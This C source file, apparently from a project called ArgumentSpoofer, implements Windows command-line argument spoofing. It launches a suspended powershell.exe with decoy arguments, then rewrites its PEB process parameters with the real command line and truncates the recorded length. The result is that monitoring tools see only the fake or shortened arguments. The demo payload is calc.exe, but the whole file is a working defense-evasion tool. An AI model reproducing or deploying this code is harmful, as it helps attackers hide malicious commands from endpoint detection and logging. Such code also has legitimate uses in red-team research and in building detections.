// Module by k3rnel-dev 
// https://github.com/k3rnel-dev/ArgumentSpoofer

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
    );

BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {
    SIZE_T sNmbrOfBytesWritten = NULL;
    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[i] Bytes Written : %d Of %d \n", (int)sNmbrOfBytesWritten, (int)dwBufferSize);
        return FALSE;
    }
    return TRUE;
}

BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {
    SIZE_T sNmbrOfBytesRead = NULL;
    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
        printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[i] Bytes Read : %d Of %d \n", (int)sNmbrOfBytesRead, (int)dwBufferSize);
        return FALSE;
    }
    return TRUE;
}

BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    NTSTATUS STATUS = NULL;
    WCHAR szProcess[MAX_PATH];
    STARTUPINFOW Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    PROCESS_BASIC_INFORMATION PBI = { 0 };
    ULONG uRetern = NULL;
    PPEB pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParms = NULL;

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOW);

    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL)
        return FALSE;

    lstrcpyW(szProcess, szStartupArgs);

    if (!CreateProcessW(
        NULL,
        szProcess,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        L"C:\\Windows\\System32\\",
        &Si,
        &Pi)) {
        printf("\t[!] CreateProcessW Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
        printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
        printf("\t[!] Failed To Read Target's Process Peb \n");
        return FALSE;
    }

    if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
        printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
        return FALSE;
    }

    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
        printf("\t[!] Failed To Write The Real Parameters\n");
        return FALSE;
    }

    DWORD dwNewLen = sizeof(L"powershell.exe");
    if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
        return FALSE;
    }

    HeapFree(GetProcessHeap(), NULL, pPeb);
    HeapFree(GetProcessHeap(), NULL, pParms);

    ResumeThread(Pi.hThread);

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL, *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

int main() {
    DWORD dwProcessId;
    HANDLE hProcess;
    HANDLE hThread;
    LPWSTR szStartupArgs = L"powershell.exe AAAAAAAAAAAAAAAAA"; // Your fake-argumnets
    LPWSTR szRealArgs = L"powershell.exe -NoExit calc.exe"; // Your real-arguments

    if (CreateArgSpoofedProcess(szStartupArgs, szRealArgs, &dwProcessId, &hProcess, &hThread)) {
        printf("[0x0] Process created successfully with PID: %lu\n", dwProcessId);
    }
    else {
        printf("[0x1] Failed to create process.\n");
    }

    return 0;
}
